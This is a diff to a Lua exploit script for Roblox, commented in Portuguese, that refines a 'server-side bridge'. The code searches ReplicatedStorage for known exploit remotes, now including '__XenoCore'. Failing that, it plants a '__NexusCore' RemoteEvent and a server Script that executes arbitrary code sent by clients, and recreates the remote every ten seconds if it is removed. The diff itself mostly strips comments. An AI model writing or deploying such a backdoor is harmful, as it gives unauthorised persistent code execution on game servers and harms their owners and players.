@@ -60,15 +60,14 @@ function Nexus:AddLog(msg, msgType)
 end
 
 -- ============================================================================
--- SERVER-SIDE BRIDGE (CORRIGIDA E MELHORADA)
+-- SERVER-SIDE BRIDGE (CORRIGIDA E MELHORADA, SEM ALTERAR INTERFACE)
 -- ============================================================================
 
 -- Tenta encontrar um RemoteEvent já existente que possa servir como ponte
 local function findExistingBridge()
-    -- Nomes comuns de RemoteEvents usados por scripts de exploit
     local commonNames = {
         "__UltronCore", "__NexusCore", "__Backdoor", "Remote", "PingRemote",
-        "exploit_remote", "executor_remote", "rbx_remote"
+        "exploit_remote", "executor_remote", "rbx_remote", "__XenoCore"
     }
     for _, name in ipairs(commonNames) do
         local remote = RS:FindFirstChild(name)
@@ -89,7 +88,6 @@ local function createBackdoor()
     remote.Name = "__NexusCore"
     remote.Parent = RS
 
-    -- Cria o script no servidor que escuta o remote
     local listener = SSS:FindFirstChild("__NexusCoreListener")
     if not listener then
         listener = Instance.new("Script")
@@ -110,7 +108,6 @@ local function createBackdoor()
                 end
             end
             remote.OnServerEvent:Connect(execCode)
-            -- Persistência: se o remote for removido, recria
             while true do
                 wait(10)
                 if not remote.Parent then
@@ -136,7 +133,6 @@ function Nexus:AttachServer()
         return true
     end
 
-    -- Se não encontrou, tenta criar um novo backdoor
     remote = createBackdoor()
     if remote and remote.Parent then
         self.backdoorRemote = remote
@@ -160,7 +156,6 @@ local function ensureBackdoor()
         return Nexus.backdoorRemote
     end
 
-    -- Tenta pegar um já existente
     local remote = findExistingBridge()
     if remote then
         Nexus.backdoorRemote = remote
@@ -168,7 +163,6 @@ local function ensureBackdoor()
         return remote
     end
 
-    -- Se não, cria um novo
     remote = createBackdoor()
     if remote and remote.Parent then
         Nexus.backdoorRemote = remote
@@ -210,7 +204,7 @@ function Nexus:ExecuteServer(code)
     end)
 
     remote:FireServer(code)
-    task.wait(2.0) -- Aumentado um pouco para dar tempo de resposta
+    task.wait(2.0)
 
     if not received then
         self:AddLog("Sem resposta do servidor (backdoor pode estar offline)", "warning")
